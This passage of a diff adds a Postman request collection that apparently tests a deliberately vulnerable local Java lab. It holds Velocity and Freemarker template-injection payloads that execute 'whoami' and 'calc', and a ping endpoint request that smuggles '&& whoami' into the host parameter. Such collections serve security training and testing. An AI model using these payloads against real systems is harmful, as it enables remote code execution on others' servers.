+									"value": "%23set($e='e')%23set($c=$e.getClass().forName('org.apache.commons.io.IOUtils'))$c.getMethod('toString',$e.getClass().forName('java.io.InputStream')).invoke(null, $e.getClass().forName('java.lang.Runtime').getMethod('exec', $e.getClass().forName('java.lang.String')).invoke($e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'whoami').getInputStream())"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Freemarker",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://{{base_url}}/SSTI/freemarker.do?tpl=<%23assign ob='freemarker.template.utility.ObjectConstructor'?new()><%23assign value='freemarker.template.utility.Execute'?new()>$%7Bvalue('calc')%7D",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"SSTI",
+								"freemarker.do"
+							],
+							"query": [
+								{
+									"key": "tpl",
+									"value": "<%23assign ob='freemarker.template.utility.ObjectConstructor'?new()><%23assign value='freemarker.template.utility.Execute'?new()>$%7Bvalue('calc')%7D"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "CMD",
+			"item": [
+				{
+					"name": "Ping",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://{{base_url}}/CMD/ping.do?host=baidu.com",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"CMD",
+								"ping.do"
+							],
+							"query": [
+								{
+									"key": "host",
+									"value": "baidu.com"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "PingRCE",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://{{base_url}}/CMD/pingRCE.do?host=baidu.com %26%26 whoami",
+							"protocol": "http",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"CMD",
+								"pingRCE.do"
+							],
+							"query": [
+								{
+									"key": "host",
+									"value": "baidu.com %26%26 whoami"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "base_url",
+			"value": "localhost:8080",
+			"type": "string"
+		}
+	]
+}
